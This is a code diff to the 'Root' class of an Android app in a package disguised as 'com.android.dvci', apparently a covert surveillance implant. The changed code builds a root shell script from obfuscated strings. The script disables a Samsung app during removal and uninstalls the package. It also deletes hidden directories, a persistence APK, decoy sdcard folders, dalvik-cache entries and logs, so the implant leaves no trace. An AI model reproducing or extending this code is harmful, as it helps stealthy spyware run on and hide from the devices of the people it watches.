@@ -1,6 +1,7 @@
 package com.android.dvci;
 
 import android.content.Context;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 
 import com.android.dvci.auto.Cfg;
@@ -15,6 +16,7 @@ import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.ExecuteResult;
+import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
@@ -57,6 +59,29 @@ public class Root {
 	static Semaphore semGetPermission = new Semaphore(1);
 	//private static final int DEL_OLD_FILE_MARKUP = 1;
 	private static Markup markup = new Markup(Markup.DEL_OLD_FILE_MARKUP);
+	static String[] appToDisable = new String[]{ M.e("com.samsung.videohub")};
+
+	private static boolean installed(String name) {
+
+		final ArrayList<PackageUtils.PInfo> res = new ArrayList<PackageUtils.PInfo>();
+		final PackageManager packageManager = Status.getAppContext().getPackageManager();
+		try {
+			ApplicationInfo ret = packageManager.getApplicationInfo(name, 0);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installedWhitelist) found " + name);
+			}
+			String pm = packageManager.getInstallerPackageName(name);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installedWhitelist) " + pm);
+			}
+			return true;
+		} catch (PackageManager.NameNotFoundException ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installedWhitelist) not installed: " + name);
+			}
+		}
+		return false;
+	}
 
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
@@ -312,22 +337,13 @@ public class Root {
 			//script += M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 			String script = "";
-			if (new AutoFile(Path.hidden()).exists()) {
-				script += M.e("rm -r ") + Path.hidden() + "\n";
-			}
-			script += Configuration.shellFile + M.e(" blw") + "\n";
-			/* we need to remove also /data/data/pkgName ? */
-			if (Status.getAppDir() != null) {
-				if (new AutoFile(Status.getAppDir()).exists()) {
-					script += M.e("rm -r ") + Status.getAppDir() + "\n";
+			for (String app : appToDisable) {
+				if(installed(app)) {
+					script += M.e("pm disable ") + app + "\n";
 				}
 			}
 
-			// TODO: mettere Status.persistencyApk e packageName
-			script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-
+			script += Configuration.shellFile + M.e(" blw") + "\n";
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
@@ -340,10 +356,23 @@ public class Root {
 				 */
 
 			// the
+
 			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
+			if(!Status.isPersistent()){
+				script += M.e("sleep 5\n");
+			}
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/1"), M.e("/sdcard/1")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/2"), M.e("/sdcard/2")) + "\n";
+			//if(Status.isPersistent()){
+				script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Status.getAppDir(), Status.getAppDir()) + "\n";
+				script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), Path.hidden(), Path.hidden()) + "\n";
+				// TODO: mettere Status.persistencyApk e packageName
+				script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			//}
+			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
 			script += M.e("sleep 1; ") + String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), apkPath, apkPath) + "\n";
@@ -363,7 +392,12 @@ public class Root {
 					script += M.e("rm /data/local/tmp/log 2>/dev/null") + "\n";
 				}
 			}
-
+			for (String app : appToDisable) {
+				if(installed(app)) {
+					script += M.e("pm enable ") + app + "\n";
+				}
+			}
+			Core.serivceUnregister();
 			boolean ret = Execute.executeRootAndForgetScript(script);
 			if(!ret){
 				Execute.executeScript(script);
